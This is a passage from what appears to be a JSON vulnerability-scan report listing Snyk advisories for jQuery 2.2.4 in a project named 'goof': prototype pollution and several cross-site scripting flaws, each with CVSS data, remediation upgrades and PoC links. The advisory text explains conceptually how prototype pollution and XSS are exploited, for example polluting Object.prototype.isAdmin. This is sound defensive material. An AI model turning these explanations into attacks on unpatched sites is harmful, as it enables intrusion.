attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `jquery` to version 3.4.0 or higher.\\n## References\\n- [GitHub Commit](https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b)\\n- [GitHub PR](https://github.com/jquery/jquery/pull/4333)\\n- [Hackerone Report](https://hackerone.com/reports/454365)\\n- [Snyk Blog](https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/)\\n- [Third-Party Backported Patches Repo](https://github.com/DanielRuf/snyk-js-jquery-174006)\\n\",\n  \"disclosureTime\": \"2019-03-26T08:40:15Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.4.0\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"test/core.js\",\n        \"functionName\": \"module.exports.jQuery.extend(Object, Object)\"\n      },\n      \"version\": [\n        \"<=1.8.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"src/core.js\",\n        \"functionName\": \"jQuery.extend.jQuery.fn.extend\"\n      },\n      \"version\": [\n        \">1.8.3 <=2.2.4\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"dist/core.js\",\n        \"functionName\": \"jQuery.extend.jQuery.fn.extend\"\n      },\n      \"version\": [\n        \">2.2.4 <=3.3.1\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"test/core.js\",\n        \"functionName\": \"module.exports.jQuery.extend(Object, Object)\"\n      },\n      \"version\": [\n        \"<=1.8.3\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"src/core.js\",\n        \"functionName\": \"jQuery.extend.jQuery.fn.extend\"\n      },\n      \"version\": [\n        \">1.8.3 <=2.2.4\"\n      ]\n    },\n    {\n      \"functionId\": {\n        \"filePath\": \"dist/core.js\",\n        \"functionName\": \"jQuery.extend.jQuery.fn.extend\"\n      },\n      \"version\": [\n        \">2.2.4 <=3.3.1\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-JQUERY-174006\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2019-11358\",\n      \"CVE-2019-5428\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ],\n    \"GHSA\": [\n      \"GHSA-wv67-q8rr-grjp\"\n    ],\n    \"NSP\": [\n      \"796\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-11-17T15:25:25.303045Z\",\n  \"moduleName\": \"jquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"jquery\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2019-03-27T08:40:08Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/jquery/jquery/pull/4333\"\n    },\n    {\n      \"title\": \"Hackerone Report\",\n      \"url\": \"https://hackerone.com/reports/454365\"\n    },\n    {\n      \"title\": \"Snyk Blog\",\n      \"url\": \"https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/\"\n    },\n    {\n      \"title\": \"Third-Party Backported Patches Repo\",\n      \"url\": \"https://github.com/DanielRuf/snyk-js-jquery-174006\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.4.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"jquery@2.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"jquery@3.4.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"jquery\",\n  \"version\": \"2.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , jquery@2.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2020-11023"
            ],
            "ghsaid": [
              "jpcq-cgw6-v4j6"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "SNYK-JS-JQUERY-565129",
          "desc": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\n\n## Details\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n## Remediation\n\nUpgrade `jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Release Notes](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [Security Blog](https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html?spref=tw)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-04-13T07:16:49.518552Z\",\n  \"credit\": [\n    \"Masato Kinugawa\"\n  ],\n  \"cvssScore\": 6.3,\n  \"description\": \"## Overview\\n\\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\\n\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\\nPassing HTML containing `<option>` elements from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html()`, `.append()`, and others) may execute untrusted code.\\n\\n## Details\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\r\\n\\r\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\r\\n\\r\\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\r\\n\\r\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\r\\n \\r\\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\r\\n\\r\\n### Types of attacks\\r\\nThere are a few methods by which XSS can be manipulated:\\r\\n\\r\\n|Type|Origin|Description|\\r\\n|--|--|--|\\r\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\r\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\r\\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\r\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\r\\n\\r\\n### Affected environments\\r\\nThe following environments are susceptible to an XSS attack:\\r\\n\\r\\n* Web servers\\r\\n* Application servers\\r\\n* Web application environments\\r\\n\\r\\n### How to prevent\\r\\nThis section describes the top best practices designed to specifically protect your code: \\r\\n\\r\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\r\\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\r\\n* Give users the option to disable client-side scripts.\\r\\n* Redirect invalid requests.\\r\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\r\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\r\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n## Remediation\\n\\nUpgrade `jquery` to version 3.5.0 or higher.\\n\\n\\n## References\\n\\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\\n\\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\\n\\n- [Release Notes](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\\n\\n- [Security Blog](https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html?spref=tw)\\n\",\n  \"disclosureTime\": \"2020-04-10T00:00:00Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.5.0\"\n  ],\n  \"functions\": [\n    {\n      \"functionId\": {\n        \"className\": null,\n        \"filePath\": \"src/manipulation.js\",\n        \"functionName\": \"htmlPrefilter\"\n      },\n      \"version\": [\n        \">=1.0.3 <3.5.0\"\n      ]\n    }\n  ],\n  \"functions_new\": [\n    {\n      \"functionId\": {\n        \"filePath\": \"src/manipulation.js\",\n        \"functionName\": \"htmlPrefilter\"\n      },\n      \"version\": [\n        \">=1.0.3 <3.5.0\"\n      ]\n    }\n  ],\n  \"id\": \"SNYK-JS-JQUERY-565129\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-11023\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-jpcq-cgw6-v4j6\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-02-23T15:25:00.361296Z\",\n  \"moduleName\": \"jquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"jquery\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-04-13T15:33:49Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77\"\n    },\n    {\n      \"title\": \"PoC\",\n      \"url\": \"https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html\"\n    },\n    {\n      \"title\": \"Release Notes\",\n      \"url\": \"https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\"\n    },\n    {\n      \"title\": \"Security Blog\",\n      \"url\": \"https://masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html?spref=tw\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=1.5.1 <3.5.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"jquery@2.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"jquery@3.5.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"jquery\",\n  \"version\": \"2.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , jquery@2.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2020-11022"
            ],
            "ghsaid": [
              "gxr4-xjj5-5px2",
              "v73w-r9xg-7cr9"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "SNYK-JS-JQUERY-567880",
          "desc": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS).\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html(), .append()`, and others) may execute untrusted code.\n\n\n## Details:\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\r\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \r\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\r\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\r\n\r\n### Affected environments\r\nThe following environments are susceptible to an XSS attack:\r\n\r\n* Web servers\r\n* Application servers\r\n* Web application environments\r\n\r\n### How to prevent\r\nThis section describes the top best practices designed to specifically protect your code: \r\n\r\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \r\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \r\n* Give users the option to disable client-side scripts.\r\n* Redirect invalid requests.\r\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\r\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\r\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\n\n\n## Remediation\n\nUpgrade `jquery` to version 3.5.0 or higher.\n\n\n## References\n\n- [GHSA](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\n\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\n\n- [JQuery 3.5.0 Release](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\n\n- [JQuery Upgrade Guide](https://jquery.com/upgrade-guide/3.5/)\n\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\n\n- [Security Blog](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html)\n",
          "impact": 0.5,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N/E:P/RL:O/RC:R\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-04-30T12:29:39.885866Z\",\n  \"credit\": [\n    \"Masato Kinugawa\"\n  ],\n  \"cvssScore\": 6.5,\n  \"description\": \"## Overview\\n\\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\\n\\n\\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS).\\nPassing HTML from untrusted sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. `.html(), .append()`, and others) may execute untrusted code.\\n\\n\\n## Details:\\nA cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\\r\\n\\r\\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\\r\\n\\r\\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\\r\\n\\r\\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\\r\\n \\r\\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \\r\\n\\r\\n### Types of attacks\\r\\nThere are a few methods by which XSS can be manipulated:\\r\\n\\r\\n|Type|Origin|Description|\\r\\n|--|--|--|\\r\\n|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|\\r\\n|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| \\r\\n|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|\\r\\n|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|\\r\\n\\r\\n### Affected environments\\r\\nThe following environments are susceptible to an XSS attack:\\r\\n\\r\\n* Web servers\\r\\n* Application servers\\r\\n* Web application environments\\r\\n\\r\\n### How to prevent\\r\\nThis section describes the top best practices designed to specifically protect your code: \\r\\n\\r\\n* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. \\r\\n* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. \\r\\n* Give users the option to disable client-side scripts.\\r\\n* Redirect invalid requests.\\r\\n* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.\\r\\n* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.\\r\\n* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.\\n\\n\\n## Remediation\\n\\nUpgrade `jquery` to version 3.5.0 or higher.\\n\\n\\n## References\\n\\n- [GHSA](https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2)\\n\\n- [GitHub Commit](https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77)\\n\\n- [JQuery 3.5.0 Release](https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/)\\n\\n- [JQuery Upgrade Guide](https://jquery.com/upgrade-guide/3.5/)\\n\\n- [PoC](https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html)\\n\\n- [Security Blog](https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html)\\n\",\n  \"disclosureTime\": \"2020-04-29T23:02:09Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.5.0\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-JQUERY-567880\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-11022\"\n    ],\n    \"CWE\": [\n      \"CWE-79\"\n    ],\n    \"GHSA\": [\n      \"GHSA-gxr4-xjj5-5px2\",\n      \"GHSA-v73w-r9xg-7cr9\"\n    ],\n    \"NSP\": [\n      \"1518\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-21T15:25:42.049667Z\",\n  \"moduleName\": \"jquery\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"jquery\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-04-29T23:02:09Z\",\n  \"references\": [\n    {\n      \"title\": \"GHSA\",\n      \"url\": \"https://github.com/jquery/jquery/security/advisories/GHSA-gxr4-xjj5-5px2\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/jquery/jquery/commit/1d61fd9407e6fbe82fe55cb0b938307aa0791f77\"\n    },\n    {\n      \"title\": \"JQuery 3.5.0 Release\",\n      \"url\": \"https://blog.jquery.com/2020/04/10/jquery-3-5-0-released/\"\n    },\n    {\n      \"title\": \"JQuery Upgrade Guide\",\n      \"url\": \"https://jquery.com/upgrade-guide/3.5/\"\n    },\n    {\n      \"title\": \"PoC\",\n      \"url\": \"https://vulnerabledoma.in/jquery_htmlPrefilter_xss.html\"\n    },\n    {\n      \"title\": \"Security Blog\",\n      \"url\": \"https://mksben.l0.cm/2020/05/jquery3.5.0-xss.html\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=1.2.0 <3.5.0\"\n    ]\n  },\n  \"severity\": \"medium\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Cross-site Scripting (XSS)\",\n  \"severityWithCritical\": \"medium\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"jquery@2.2.4\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"jquery@3.5.0\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"jquery\",\n  \"version\": \"2.2.4\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , jquery@2.2.4 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-001310"
            ],
            "nist": [
              "SI-10"
            ],
            "cweid": [
              "79"
            ],
            "cveid": [
              "2015-9251",
              "2017-16012"
            ],
            "ghsaid": [
              "rmxg-73gg-4p98"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Cross-site Scripting (XSS)",
          "id": "npm:jquery:20150627",
          "desc": "## Overview\n\n[jquery](https://www.npmjs.com/package/jquery) is a package that makes things like HTML document traversal and manipulation, event handling, animation, and Ajax much simpler with an easy-to-use API that works across a multitude of browsers.\n\n\nAffected versions of this package are vulnerable to Cross-site Scripting (XSS)\nattacks when a cross-domain ajax request is performed without the `dataType` option causing `text/javascript` responses to be executed.\n\n## Details\n A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.\r\n\r\nThis is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.\r\n\r\nֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.\r\n\r\nEscaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.\r\n \r\nThe most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. \r\n\r\n### Types of attacks\r\nThere are a few methods by which XSS can be manipulated:\r\n\r\n|Type|Origin|Description|\r\n|--|--|--|\r\n|**Stored**|Server|The 